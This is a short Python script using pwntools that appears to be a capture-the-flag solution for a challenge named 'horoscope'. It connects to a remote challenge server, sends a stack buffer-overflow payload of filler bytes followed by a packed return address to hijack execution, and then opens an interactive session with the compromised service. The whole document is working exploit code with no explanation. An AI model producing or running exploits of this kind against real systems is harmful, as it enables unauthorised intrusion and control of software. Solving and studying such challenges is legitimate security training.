from pwn import *

io = remote('horoscope.sdc.tf', 1337)

p = b'11/'+53*b'A'+p64(0x000000000040095f)
print(io.recv())
io.sendline(p)
io.interactive()
